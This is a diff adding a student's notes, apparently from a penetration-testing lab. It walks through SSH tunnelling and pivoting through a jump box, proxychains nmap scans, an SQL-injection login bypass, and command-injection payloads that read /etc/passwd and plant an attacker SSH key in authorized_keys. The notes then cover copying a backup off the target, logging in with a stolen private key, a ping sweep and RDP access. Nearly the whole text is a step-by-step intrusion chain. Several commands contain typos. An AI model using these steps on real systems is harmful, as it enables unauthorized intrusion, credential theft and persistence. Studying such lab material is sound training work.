@@ -1,0 +1,63 @@
+
+
+1st Terminal
+  ssh -MS /tmp/jump student@10.50.29.89  (connection to jump box)
+  2nd Terminal
+  ssh -S /tmp/jump jim
+  3rd Terminal
+  ssh -S /tmp/jump jim -O forward -D9050
+  4th Terminal
+  ssh -S /tmp/jump jim -O forward -L 5800:192.168.28.100:80 
+  ssh -S /tmp/jump jim -O forward -L 5801:192.168.28.100:2222
+  proxychains nmap -n 192.168.28.100 --script=http-enum
+  
+  On firefox try /admin/login.php
+  For logging in tom' OR 1= '1
+  In Text box: 
+  ; cat /etc/passwd
+  ; whoami
+  ; ls -lisa /var/www
+  ; mkdir /var/www/.ssh
+  ;  /var/www/.ssh/authorized_keys
+  ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4hTL7+0uXquwVfAMV/EmJr/m/aHSnPyRj81phpUqQHMNnStH6yuR15z1KAx29uL77aiy+/H0lr7K0hNIF7G7YwCVLb6FziHYKlxJuGTi6M9Fcs/eFLBQkn8M0szQCKJOUMcYhJ++bcMkM3w4GlDi5fm0NLm8DmUz+jaS7FwN9ddyLSgu6va1eKDRRbfvdRRtMQl12wsBbSOiQntVv3ZCwVFg+Ooeu9UsV+GTEnVEa927NEkPtLJK03VYRBlcBkItNCxSkwoUqSv2jgdRV446YXqQC8Tsa7yy9g3t0pz9J2jBwSPSLO7eqSAE5Di5yXUbhgF7/YmpN5UcTAwgRMMRl student@lin-ops" > /var/www/.ssh/authorized_keys
+  
+  ssh -i wwwdata www-data@127.0.0.1 -p 5801
+  Once on the machine navigate to user comrade's "Dekstop" for Etranet 1
+  Etranet 2: navigate to /usr/share because why not
+  Intranet 1: relating to local name resolution; /etc/hosts IP:192.168.150.253
+  scp /tmp/backup.tar.gz student@10.50.26.72:/home/student
+  On Lin OPS: backup.tar.gz
+  Now nmap new IP and create a tunnel to new target
+  ssh -i wwwdata -MS /tmp/grey www-data@127.0.0.1 -p 5801
+  ssh -S /tmp/jump jim -O cancel -D9050
+  ssh -S /tmp/grey grey -O forward -D9050
+  proxychains nmap 192.168.150.253 -Pn -T4 -p 1-9999
+  ssh -S /tmp/jump jim -O forward -L 5802:192.168.150.253:80
+  ssh -S /tmp/jump jim -O forward -L 5803:192.168.150.253:514
+  ssh -S /tmp/jump jim -O forward -L 5804:192.168.150.253:3201
+  mkdir stolenkey
+  mkdir stolenkey/.ssh
+  touch stolenkey/.ssh/authorized_keys
+  vi authorized_keys (Put the private key we found for comrade)
+  mkdir stolenkeys/stolenwey
+  tar -xvf backup.tar
+   proxychains ssh -i /home/student/stolenkey/stolkenway/.ssh/id_rsa comrade@192.168.150.253 -p 3201
+   Found in etc/hosts: 192.168.56.1   badguy
+   cat /etc/rsyslog.d/50-default.conf
+   
+   comrade::StudentMidwayPassword
+   cat /var/log/syslog
+   /etc/rkhunter.conf
+   
+   sudo cat /root/brootkit/brootkit-master/br.conf
+   REMOTE_HOST		192.168.215.128
+   REMOTE_PORT		8080
+   
+   
+   *Use "" when you are google searching for commands
+   
+   
+   for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done   (Do this on extranet)
+   ssh -S /tmp/grey grey -O forward -L 5807:192.168.28.9:3389
+   xfreerdp /v:127.0.0.1:5807 /u:comrade /gltph-cache /clipbboard /dynamic-resolution
+   
